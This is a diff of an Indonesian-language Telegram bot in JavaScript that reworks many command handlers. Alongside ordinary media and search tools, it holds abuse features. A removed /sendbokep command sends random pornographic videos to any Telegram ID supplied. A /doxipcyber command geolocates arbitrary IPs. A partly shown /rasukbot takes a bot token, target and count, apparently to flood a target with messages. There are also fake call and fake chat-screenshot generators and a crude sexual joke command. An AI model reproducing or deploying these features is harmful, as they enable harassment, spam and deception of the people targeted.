-  let message = "𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 ‼️";
+  let message = "𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 ‼️\n";
   premiumUsers.forEach((user, index) => {
     const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
     message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
@@ -2108,7 +2160,7 @@ bot.onText(/\/listprem/, (msg) => {
 
   bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 });
-//=====================================
+
 bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id
@@ -2136,7 +2188,6 @@ bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
-    // Cek apakah pengguna adalah owner atau admin
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
         return bot.sendMessage(chatId, "❌ You are not authorized to remove Vip users.");
     }
@@ -2151,13 +2202,11 @@ bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
         return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
     }
 
-    // Cari index user dalam daftar premium
     const index = premiumUsers.findIndex(user => user.id === userId);
     if (index === -1) {
         return bot.sendMessage(chatId, `❌ User ${userId} is not in the Vip list.`);
     }
 
-    // Hapus user dari daftar
     premiumUsers.splice(index, 1);
     savePremiumUsers();
     bot.sendMessage(chatId, `✅ User ${userId} has been removed from the regis list.`);
@@ -2167,7 +2216,6 @@ bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
-    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
     if (!isOwner(senderId)) {
         return bot.sendMessage(
             chatId,
@@ -2176,7 +2224,6 @@ bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
         );
     }
 
-    // Pengecekan input dari pengguna
     if (!match || !match[1]) {
         return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
     }
@@ -2186,7 +2233,6 @@ bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
         return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
     }
 
-    // Cari dan hapus user dari adminUsers
     const adminIndex = adminUsers.indexOf(userId);
     if (adminIndex !== -1) {
         adminUsers.splice(adminIndex, 1);
@@ -2197,8 +2243,6 @@ bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
         bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
     }
 });
-
-let verified = false;
 
 bot.onText(/^\/?verif (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
@@ -2282,168 +2326,21 @@ bot.onText(/^\/iqc (.+)/, async (msg, match) => {
   )}&messageText=${messageText}&emojiStyle=apple`;
 
   try {
-    let res = await fetch(url);
-    if (!res.ok) {
-      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
-    }
+    const res = await axios.get(url);
+    const imageUrl = res.data.imageUrl;
 
-    let buffer;
-    if (typeof res.buffer === "function") {
-      buffer = await res.buffer();
+    if (imageUrl) {
+      await bot.sendPhoto(chatId, imageUrl, {
+        caption: "✅ *Berhasil membuat fake iPhone quoted!*",
+        parse_mode: "Markdown",
+      });
     } else {
-      let arrayBuffer = await res.arrayBuffer();
-      buffer = Buffer.from(arrayBuffer);
+      bot.sendMessage(chatId, "❌ Gagal membuat fake iPhone quoted.");
     }
-
-    await bot.sendPhoto(chatId, buffer, {
-      caption: `✅ Nih hasilnya`,
-      parse_mode: "Markdown",
-    });
-  } catch (e) {
-    console.error(e);
-    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
-  }
-});
-
-bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
-  try {
-    const OWNER_ID = 7257623756; // Ganti dengan ID owner kamu
-    const userId = msg.from.id;
-    const chatId = msg.chat.id;
-    const text = (match[1] || "").trim();
-    const name = msg.from.first_name || "Tanpa Nama";
-
-    if (!text)
-      return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi permintaan fitur>");
-
-    const message = `
-📩 *Permintaan Fitur Baru*  
-👤 Dari: ${name}  
-🆔 ID: ${userId}  
-
-💬 Pesan:  
-${text}
-    `;
-
-    await bot.sendMessage(OWNER_ID, message, { parse_mode: "Markdown" });
-    await bot.sendMessage(chatId, "✅ Permintaan fitur kamu sudah dikirim ke owner.");
   } catch (err) {
-    console.error("❌ Error di /reqfitur:", err.message);
-    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengirim permintaan fitur.");
+    console.error(err);
+    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat fake iPhone quoted.");
   }
-});
-
-const videoList = [
-  "https://files.catbox.moe/8c7gz3.mp4", 
-  "https://files.catbox.moe/nk5l10.mp4", 
-  "https://files.catbox.moe/r3ip1j.mp4", 
-  "https://files.catbox.moe/71l6bo.mp4", 
-  "https://files.catbox.moe/rdggsh.mp4", 
-  "https://files.catbox.moe/3288uf.mp4", 
-  "https://files.catbox.moe/jdopgq.mp4", 
-  "https://files.catbox.moe/8ca9cw.mp4", 
-  "https://files.catbox.moe/b99qh3.mp4", 
-  "https://files.catbox.moe/6bkokw.mp4", 
-  "https://files.catbox.moe/ebisdh.mp4", 
-  "https://files.catbox.moe/3yko44.mp4", 
-  "https://files.catbox.moe/apqlvo.mp4", 
-  "https://files.catbox.moe/wqe1r7.mp4", 
-  "https://files.catbox.moe/nk5l10.mp4", 
-  "https://files.catbox.moe/8c7gz3.mp4", 
-  "https://files.catbox.moe/wqe1r7.mp4", 
-  "https://files.catbox.moe/n37liq.mp4", 
-  "https://files.catbox.moe/0728bg.mp4", 
-  "https://files.catbox.moe/p69jdc.mp4", 
-  "https://files.catbox.moe/occ3en.mp4", 
-  "https://files.catbox.moe/y8hmau.mp4", 
-  "https://files.catbox.moe/tvj95b.mp4", 
-  "https://files.catbox.moe/3g2djb.mp4", 
-  "https://files.catbox.moe/xlbafn.mp4", 
-  "https://files.catbox.moe/br8crz.mp4", 
-  "https://files.catbox.moe/h2w5jl.mp4", 
-  "https://files.catbox.moe/8y32qo.mp4", 
-  "https://files.catbox.moe/9w39ag.mp4", 
-  "https://files.catbox.moe/gv4087.mp4", 
-  "https://files.catbox.moe/uw6qbs.mp4", 
-  "https://files.catbox.moe/a537h1.mp4", 
-  "https://files.catbox.moe/4x09p9.mp4", 
-  "https://files.catbox.moe/n992te.mp4", 
-  "https://files.catbox.moe/ltdsbm.mp4", 
-  "https://files.catbox.moe/rt62tl.mp4", 
-  "https://files.catbox.moe/y4rote.mp4", 
-  "https://files.catbox.moe/dxn5oj.mp4", 
-  "https://files.catbox.moe/tw6m9q.mp4", 
-  "https://files.catbox.moe/qfl235.mp4", 
-  "https://files.catbox.moe/q9f2rs.mp4", 
-  "https://files.catbox.moe/e5ci9z.mp4", 
-  "https://files.catbox.moe/cdl11t.mp4",
-  "https://files.catbox.moe/zjo5r6.mp4",
-  "https://files.catbox.moe/7i6amv.mp4", 
-  "https://files.catbox.moe/pmyi1y.mp4",
-  "https://files.catbox.moe/fxe94h.mp4",
-  "https://files.catbox.moe/52oh63.mp4",
-  "https://files.catbox.moe/ite58a.mp4",
-  "https://files.catbox.moe/svw26n.mp4",
-  "https://files.catbox.moe/bv5yaa.mp4",
-  "https://files.catbox.moe/ozk5xr.mp4",
-  "https://files.catbox.moe/926k9a.mp4"
-];
-
-let lastVideoIndex = -1;
-
-function pickRandomVideo() {
-  let i;
-  do {
-    i = Math.floor(Math.random() * videoList.length);
-  } while (i === lastVideoIndex && videoList.length > 1);
-
-  lastVideoIndex = i;
-  return videoList[i];
-}
-
-// --- Command: /sendbokep <telegram_id> ---
-bot.onText(/\/sendbokep\s+(\d+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const targetId = match[1];
-
-  let waitingMsg = await bot.sendMessage(
-    chatId,
-    `🔍 *Memeriksa pengguna...*`,
-    { parse_mode: "Markdown" }
-  );
-
-  try {
-    const videoUrl = pickRandomVideo();
-
-    // Kirim langsung ke target Telegram
-    await bot.sendVideo(targetId, videoUrl, {
-      caption: "📹 Nih videonya bre...",
-    });
-
-    await bot.editMessageText(
-      `✅ *Terkirim sukses ke:* \`${targetId}\``,
-      {
-        chat_id: chatId,
-        message_id: waitingMsg.message_id,
-        parse_mode: "Markdown",
-      }
-    );
-
-  } catch (err) {
-    await bot.editMessageText(
-      `❌ *Gagal mengirim:* ${err.message}`,
-      {
-        chat_id: chatId,
-        message_id: waitingMsg.message_id,
-        parse_mode: "Markdown",
-      }
-    );
-  }
-});
-
-// Jika format salah
-bot.onText(/\/sendbokep$/, (msg) => {
-  bot.sendMessage(msg.chat.id, "Format benar:\n/sendbokep <id_telegram>");
 });
 
 bot.onText(/^\/spotifysearch (.+)/, async (msg, match) => {
@@ -2454,29 +2351,28 @@ bot.onText(/^\/spotifysearch (.+)/, async (msg, match) => {
     await bot.sendMessage(chatId, "🔎 Nyari lagu di Spotify... tunggu bentar bre 🎧");
 
     const api = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
-    const { data } = await axios.get(api);
+    const res = await axios.get(api);
 
-    if (!data.success || !data.result || !data.result.length) {
+    if (!res.data.success || !res.data.result || !res.data.result.length) {
       return bot.sendMessage(chatId, "❌ Gagal nemuin lagu di Spotify bre!");
     }
 
     let caption = "🎶 *Hasil Pencarian Spotify:*\n\n";
 
-    data.result.slice(0, 10).forEach((item, i) => {
+    res.data.result.slice(0, 10).forEach((item, i) => {
       caption += `*${i + 1}. ${item.title}*\n`;
       caption += `👤 ${item.artist}\n`;
       caption += `🕒 ${item.duration}\n`;
       caption += `🔗 [Buka Spotify](${item.url})\n\n`;
     });
 
-    // Kirim cover + caption
-    bot.sendPhoto(chatId, data.result[0].cover, {
+    bot.sendPhoto(chatId, res.data.result[0].cover, {
       caption,
       parse_mode: "Markdown",
     });
 
   } catch (err) {
-    console.error("Spotify Search Error:", err.message);
+    console.error("Spotify Search Error:", err);
     bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencari lagu di Spotify bre.");
   }
 });
@@ -2485,17 +2381,15 @@ bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const command = match[1];
-  const ip = match[2]?.trim(); // bisa kosong
+  const ip = match[2]?.trim();
 
   try {
-    // kalau ip kosong, ambil IP publik si user
     const targetIP = ip || (await axios.get("https://api.ipify.org?format=json")).data.ip;
 
     await bot.sendMessage(chatId, `🌍 Mengecek informasi IP *${targetIP}*...`, {
       parse_mode: "Markdown",
     });
 
-    // Ambil data IP dari ipwho.is
     const { data: res } = await axios.get(`https://ipwho.is/${targetIP}`);
 
     if (!res.success) {
@@ -2504,7 +2398,6 @@ bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
       });
     }
 
-    // Format hasil
     const info = `
 *📡 Informasi IP*
 • IP: ${res.ip || "N/A"}
@@ -2514,11 +2407,11 @@ bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
 • City: ${res.city || "N/A"}
 • Latitude: ${res.latitude || "N/A"}
 • Longitude: ${res.longitude || "N/A"}
-• ISP: ${res.connection?.isp || "N/A"}
-• Org: ${res.connection?.org || "N/A"}
-• Domain: ${res.connection?.domain || "N/A"}
-• Timezone: ${res.timezone?.id || "N/A"}
-• Local Time: ${res.timezone?.current_time || "N/A"}
+• ISP: ${res.connection?.isp || "-"}
+• Org: ${res.connection?.org || "-"}
+• Domain: ${res.connection?.domain || "-"}
+• Timezone: ${res.timezone?.id || "-"}
+• Local Time: ${res.timezone?.current_time || "-"}
 `;
 
     if (res.latitude && res.longitude) {
@@ -2534,159 +2427,137 @@ bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
   }
 });
 
-// /veo3 prompt (HARUS reply foto)
 bot.onText(/^\/Ai(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const prompt = match[1]?.trim();
   const reply = msg.reply_to_message;
 
+  if (!reply || !reply.photo) {
+    return bot.sendMessage(chatId, `⚠️ Reply foto lalu kirim:\n/veo3 "prompt"`);
+  }
+
+  if (!prompt) {
+    return bot.sendMessage(chatId, "⚠️ Tambahkan prompt untuk video!");
+  }
+
+  await fs.ensureDir("./temp");
+
+  const photo = reply.photo[reply.photo.length - 1];
+  const file = await bot.getFile(photo.file_id);
+
+  const tokenToUse = bot.token || process.env.TELEGRAM_TOKEN;
+  if (!tokenToUse) {
+    return bot.sendMessage(chatId, "❌ Token bot tidak ditemukan.");
+  }
+
+  const fileUrl = `https://api.telegram.org/file/bot${tokenToUse}/${file.file_path}`;
+
+  const tempPath = path.join(
+    "./temp",
+    `${Date.now()}_${path.basename(file.file_path)}`
+  );
+
+  const writer = fs.createWriteStream(tempPath);
+  const response = await axios.get(fileUrl, { responseType: "stream" });
+  response.data.pipe(writer);
+
+  await new Promise((resolve, reject) => {
+    writer.on("finish", resolve);
+    writer.on("error", reject);
+  });
+
+  const formData = new FormData();
+  formData.append("file", fs.createReadStream(tempPath));
+
+  const upload = await axios.post(
+    "https://tmpfiles.org/api/v1/upload",
+    formData,
+    { headers: formData.getHeaders() }
+  );
+
+  await fs.unlink(tempPath);
+
+  const imageUrl = upload.data.data.url.replace(
+    "tmpfiles.org/",
+    "tmpfiles.org/dl/"
+  );
+
+  const loading = await bot.sendMessage(
+    chatId,
+    "⏳ Sedang membuat video dari image..."
+  );
+
+  const payload = {
+    videoPrompt: prompt,
+    videoAspectRatio: "16:9",
+    videoDuration: 5,
+    videoQuality: "540p",
+    videoModel: "v4.5",
+    videoImageUrl: imageUrl,
+    videoPublic: false,
+  };
+
+  let taskId;
   try {
-    // Validasi reply foto
-    if (!reply || !reply.photo) {
-      return bot.sendMessage(chatId, `⚠️ Reply foto lalu kirim:\n/veo3 "prompt"`);
-    }
-
-    if (!prompt) {
-      return bot.sendMessage(chatId, "⚠️ Tambahkan prompt untuk video!");
-    }
-
-    await fs.ensureDir("./temp");
-
-    // Ambil foto resolusi tertinggi
-    const photo = reply.photo[reply.photo.length - 1];
-    const file = await bot.getFile(photo.file_id);
-
-    const tokenToUse = bot.token || process.env.TELEGRAM_TOKEN;
-    if (!tokenToUse) {
-      return bot.sendMessage(chatId, "❌ Token bot tidak ditemukan.");
-    }
-
-    const fileUrl = `https://api.telegram.org/file/bot${tokenToUse}/${file.file_path}`;
-
-    const tempPath = path.join(
-      "./temp",
-      `${Date.now()}_${path.basename(file.file_path)}`
+    const gen = await axios.post(
+      "https://veo31ai.io/api/pixverse-token/gen",
+      payload,
+      { headers: { "Content-Type": "application/json" } }
     );
-
-    // Download foto
-    const writer = fs.createWriteStream(tempPath);
-    const response = await axios.get(fileUrl, { responseType: "stream" });
-    response.data.pipe(writer);
-
-    await new Promise((resolve, reject) => {
-      writer.on("finish", resolve);
-      writer.on("error", reject);
-    });
-
-    // Upload ke tmpfiles (WAJIB pakai form-data dari npm)
-    const formData = new FormData();
-    formData.append("file", fs.createReadStream(tempPath));
-
-    const upload = await axios.post(
-      "https://tmpfiles.org/api/v1/upload",
-      formData,
-      { headers: formData.getHeaders() }
-    );
-
-    await fs.unlink(tempPath);
-
-    const imageUrl = upload.data.data.url.replace(
-      "tmpfiles.org/",
-      "tmpfiles.org/dl/"
-    );
-
-    const loading = await bot.sendMessage(
-      chatId,
-      "⏳ Sedang membuat video dari image..."
-    );
-
-    // Payload API
-    const payload = {
-      videoPrompt: prompt,
-      videoAspectRatio: "16:9",
-      videoDuration: 5,
-      videoQuality: "540p",
-      videoModel: "v4.5",
-      videoImageUrl: imageUrl,
-      videoPublic: false,
-    };
-
-    // Generate task
-    let taskId;
-    try {
-      const gen = await axios.post(
-        "https://veo31ai.io/api/pixverse-token/gen",
-        payload,
-        { headers: { "Content-Type": "application/json" } }
-      );
-      taskId = gen.data.taskId;
-    } catch (err) {
-      console.log(`${STEMPEL}`, "GEN ERROR RAW:", err.response?.data || err);
-      return bot.editMessageText(
-        `❌ Error dari server:\n<code>${JSON.stringify(
-          err.response?.data || err,
-          null,
-          2
-        )}</code>`,
-        { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
-      );
-    }
-
-    if (!taskId) {
-      return bot.editMessageText(
-        "❌ Gagal membuat task video (taskId kosong)",
-        { chat_id: chatId, message_id: loading.message_id }
-      );
-    }
-
-    // Tunggu video selesai
-    let videoUrl;
-    const timeout = Date.now() + 180000;
-
-    while (Date.now() < timeout) {
-      const res = await axios.post(
-        "https://veo31ai.io/api/pixverse-token/get",
-        {
-          taskId,
-          videoPublic: false,
-          videoQuality: "540p",
-          videoAspectRatio: "16:9",
-          videoPrompt: prompt,
-        }
-      );
-
-      if (res.data?.videoData?.url) {
-        videoUrl = res.data.videoData.url;
-        break;
-      }
-
-      await new Promise((r) => setTimeout(r, 5000));
-    }
-
-    if (!videoUrl) {
-      return bot.editMessageText(
-        "❌ Video belum tersedia atau gagal dibuat.",
-        { chat_id: chatId, message_id: loading.message_id }
-      );
-    }
-
-    await bot.editMessageText(
-      `✅ Video berhasil dibuat!\n📎 ${videoUrl}`,
-      { chat_id: chatId, message_id: loading.message_id }
-    );
+    taskId = gen.data.taskId;
   } catch (err) {
-    console.log(`${STEMPEL}`, "GLOBAL ERROR RAW:", err.response?.data || err);
-
-    bot.sendMessage(
-      chatId,
-      `❌ Error:\n<code>${JSON.stringify(
-        err.response?.data || err.message,
+    console.log(`${STEMPEL}`, "GEN ERROR RAW:", err.response?.data || err);
+    return bot.editMessageText(
+      `❌ Error dari server:\n<code>${JSON.stringify(
+        err.response?.data || err,
         null,
         2
       )}</code>`,
-      { parse_mode: "HTML" }
+      { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
     );
   }
+
+  if (!taskId) {
+    return bot.editMessageText(
+      "❌ Gagal membuat task video (taskId kosong)",
+      { chat_id: chatId, message_id: loading.message_id }
+    );
+  }
+
+  let videoUrl;
+  const timeout = Date.now() + 180000;
+
+  while (Date.now() < timeout) {
+    const res = await axios.post(
+      "https://veo31ai.io/api/pixverse-token/get",
+      {
+        taskId,
+        videoPublic: false,
+        videoQuality: "540p",
+        videoAspectRatio: "16:9",
+        videoPrompt: prompt,
+      }
+    );
+
+    if (res.data?.videoData?.url) {
+      videoUrl = res.data.videoData.url;
+      break;
+    }
+
+    await new Promise((r) => setTimeout(r, 5000));
+  }
+
+  if (!videoUrl) {
+    return bot.editMessageText(
+      "❌ Video belum tersedia atau gagal dibuat.",
+      { chat_id: chatId, message_id: loading.message_id }
+    );
+  }
+
+  await bot.editMessageText(
+    `✅ Video berhasil dibuat!\n📎 ${videoUrl}`,
+    { chat_id: chatId, message_id: loading.message_id }
+  );
 });
 
 bot.onText(/^\/getsession$/, async (msg) => {
@@ -2710,7 +2581,7 @@ bot.onText(/^\/getsession$/, async (msg) => {
       caption: "📦 Session file requested",
     });
 
-    fs.unlinkSync(tmpPath); // hapus file setelah dikirim
+    fs.unlinkSync(tmpPath);
 
   } catch (err) {
     console.error("GetSession Error:", err.message);
@@ -2729,7 +2600,6 @@ bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
     );
   }
 
-  // pesan loading
   await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");
 
   try {
@@ -2765,7 +2635,6 @@ bot.onText(/^\/play (.+)/, async (msg, match) => {
   try {
     const wait = await bot.sendMessage(chatId, "🎧 Nyari lagunya bre...");
 
-    // Search Spotify
     const searchApi = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
     const res = await axios.get(searchApi);
 
@@ -2778,7 +2647,6 @@ bot.onText(/^\/play (.+)/, async (msg, match) => {
 
     const top = res.data.result[0];
 
-    // ambil mp3 dari spotify v2
     const dl = await axios.get(
       `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(top.url)}`
     );
@@ -2786,7 +2654,6 @@ bot.onText(/^\/play (.+)/, async (msg, match) => {
     const mp3 = dl.data?.data?.mp3DownloadLink;
     if (!mp3) throw new Error("Gagal ambil link mp3 bre!");
 
-    // download buffer
     const buffer = await axios
       .get(mp3, { responseType: "arraybuffer" })
       .then((r) => Buffer.from(r.data));
@@ -2815,9 +2682,7 @@ bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
 
   try {
     const res = await fetch(`https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(text)}`);
-    if (!res.ok) throw new Error(`HTTP error ${res.status}`);
-
-    const buffer = Buffer.from(await res.arrayBuffer()); // ✅ FIX disini
+    const buffer = await res.buffer();
 
     const tmpFile = path.join(__dirname, `bratvid_${Date.now()}.webm`);
     fs.writeFileSync(tmpFile, buffer);
@@ -2825,8 +2690,8 @@ bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
     await bot.sendSticker(chatId, tmpFile);
 
     fs.unlinkSync(tmpFile);
-  } catch (e) {
-    console.error(e);
+  } catch (err) {
+    console.error(err);
     bot.sendMessage(chatId, "❌ Gagal generate sticker video.");
   }
 });
@@ -2834,7 +2699,6 @@ bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
 bot.onText(/^\/hd$/, async (msg) => {
   const chatId = msg.chat.id;
 
-  // HARUS reply foto
   if (!msg.reply_to_message || !msg.reply_to_message.photo) {
     return bot.sendMessage(
       chatId,
@@ -2845,16 +2709,13 @@ bot.onText(/^\/hd$/, async (msg) => {
   try {
     await bot.sendMessage(chatId, "⏳ Lagi ng-HD foto lu bre...");
 
-    // Ambil foto resolusi tertinggi
     const photo = msg.reply_to_message.photo.pop();
     const file = await bot.getFile(photo.file_id);
     const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
 
-    // Download foto dari Telegram
     const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
     const buffer = Buffer.from(dl.data);
 
-    // Upload ke tmpfiles
     const FormData = require("form-data");
     const form = new FormData();
     form.append("file", buffer, "image.jpg");
@@ -2865,7 +2726,6 @@ bot.onText(/^\/hd$/, async (msg) => {
 
     const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
 
-    // API HD
     const hd = await axios.get(
       `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
     );
@@ -2876,7 +2736,6 @@ bot.onText(/^\/hd$/, async (msg) => {
 
     const result = hd.data.result;
 
-    // Kirim hasil HD
     await bot.sendPhoto(chatId, result, {
       caption: `✅ Foto berhasil di-HD cok!\n${result}`,
       parse_mode: "HTML",
@@ -2893,7 +2752,6 @@ bot.onText(/\/fixcode/, async (msg) => {
   const replyMsg = msg.reply_to_message;
 
   try {
-    // Cek apakah user reply ke file .js
     if (!replyMsg || !replyMsg.document) {
       return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
         parse_mode: "Markdown",
@@ -2905,15 +2763,12 @@ bot.onText(/\/fixcode/, async (msg) => {
       return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
     }
 
-    // Ambil file link
     const fileLink = await bot.getFileLink(file.file_id);
     await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");
 
-    // Download isi file
     const response = await axios.get(fileLink, { responseType: "arraybuffer" });
     const fileContent = Buffer.from(response.data).toString("utf-8");
 
-    // Kirim ke API NekoLabs
     const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
       params: {
         text: fileContent,
@@ -2948,13 +2803,14 @@ Fokus pada:
       filename: `fixed_${file.file_name}`,
       contentType: "text/javascript",
     });
+
   } catch (err) {
     console.error("FixCode Error:", err);
     bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
   }
 });
 
-bot.onText(/^\/?fakecall(?:@[\w_]+)?\s*(.*)$/i, async (msg, match) => {
+bot.onText(/^\/fakecall(?:@[\w_]+)?\s*(.*)$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const args = match[1].split("|");
 
@@ -2971,12 +2827,14 @@ bot.onText(/^\/?fakecall(?:@[\w_]+)?\s*(.*)$/i, async (msg, match) => {
 
   try {
     const fileId = msg.reply_to_message.photo.pop().file_id;
-    const fileLink = await bot.getFileLink(fileId);
+    const fileUrl = await bot.getFileLink(fileId);
 
     const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
       nama
-    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
-      fileLink
+    )}&durasi=${encodeURIComponent(
+      durasi
+    )}&avatar=${encodeURIComponent(
+      fileUrl
     )}`;
 
     const res = await fetch(api);
@@ -3008,53 +2866,51 @@ bot.onText(/^\/cekkontol(?: (.+))?$/i, async (msg, match) => {
 ╭━━━━°「 *Kontol ${text}* 」°
 ┃
 ┊• Nama : ${text}
-┃• Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
+┊• Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
 ┊• True : ${pickRandom(['perjaka','ga perjaka','udah pernah dimasukin','masih ori','jumbo'])}
 ┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
-┃• ukuran : ${pickRandom(['1cm','2cm','3cm','4cm','5cm','20cm','45cm','50cm','90meter','150meter','5km','gak normal'])}
+┊• ukuran : ${pickRandom(['1cm','2cm','3cm','4cm','5cm','20cm','45cm','50cm','90meter','150meter','5km','gak normal'])}
 ╰═┅═━––––––๑`;
 
   bot.sendMessage(chatId, hasil);
 });
 
 bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
+    const chatId = msg.chat.id;
 
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
-    }
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
+    }
 
-    const url = match[1].trim();
+    const url = match[1].trim();
 
-    try {
-        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;
+    try {
+        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;
 
-        const res = await fetch(apiUrl);
-        const data = await res.json();
+        const res = await fetch(apiUrl);
+        const data = await res.json();
 
-        if (!data || !data.result) {
-            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
-        }
+        if (!data || !data.result) {
+            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
+        }
 
-        // Jika ada video
-        if (data.result.video) {
-            await bot.sendVideo(chatId, data.result.video, {
-                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
-            });
-        } 
-        // Jika hanya gambar
-        else if (data.result.image) {
-            await bot.sendPhoto(chatId, data.result.image, {
-                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
-            });
-        } 
-        else {
-            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
-        }
-    } catch (err) {
-        console.error("Instagram API Error:", err);
-        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
-    }
+        if (data.result.video) {
+            await bot.sendVideo(chatId, data.result.video, {
+                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
+            });
+        } 
+        else if (data.result.image) {
+            await bot.sendPhoto(chatId, data.result.image, {
+                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
+            });
+        } 
+        else {
+            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
+        }
+    } catch (err) {
+        console.error("Instagram API Error:", err);
+        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
+    }
 });
 
 bot.onText(/^\/rasukbot(?: (.+))?/i, async (msg, match) => {
@@ -3062,7 +2918,6 @@ bot.onText(/^\/rasukbot(?: (.+))?/i, async (msg, match) => {
   const input = (match[1] || "").trim();
   const reply = msg.reply_to_message;
 
-  // Jika user hanya mengetik /rasukbot tanpa apapun
   if (!input) {
     return bot.sendMessage(chatId,
       "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
@@ -3079,7 +2934,6 @@ bot.onText(/^\/rasukbot(?: (.+))?/i, async (msg, match) => {
   try {
     let token, targetId, pesan, jumlah;
 
-    // Jika user membalas pesan seseorang
     if (reply) {
       const parts = input.split("|").map(x => x.trim());
       if (parts.length < 3) {
@@ -3094,7 +2948,6 @@ bot.onText(/^\/rasukbot(?: (.+))?/i, async (msg, match) => {
       jumlah = parseInt(jumlah);
 
     } else {
-      // Format manual tanpa reply
       if (!input.includes("|")) {
         return bot.sendMessage(chatId,
           "📩 Format salah!\n\nGunakan format:\n" +
@@ -3227,22 +3080,18 @@ bot.onText(/^\/beritaindo$/, async (msg) => {
   await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");
 
   try {
-    // RSS Google News Indonesia
     const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
     const res = await fetch(url);
     const xml = await res.text();
 
